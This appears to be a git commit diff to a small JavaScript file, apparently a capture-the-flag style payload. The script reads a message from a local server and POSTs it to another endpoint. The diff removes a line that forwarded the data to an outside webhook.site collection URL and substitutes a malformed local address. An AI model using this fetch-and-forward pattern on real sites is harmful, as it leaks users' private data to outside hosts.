0da6ab67d743abcc7add94d050e672002c4641f2
HaNhutQuan <73058100+HaNhutQuan@users.noreply.github.com>
2022-12-10 20:14:19 +0700

    Update viewletter.js

--- :80/static/viewletter.js
+++ :80/static/viewletter.js
@@ -3,7 +3,7 @@ fetch("http://127.0.0.1:80/message/3")
     return response.text();
   })
   .then((data) => {
-    fetch("https://webhook.site/db6373ae-d9d9-457b-9570-be60f11cea7a/", {
+    fetch("https:/127.0.0.1:80/submit", {
       headers: { "content-type": "application/json" },
       body: data,
       method: "POST",
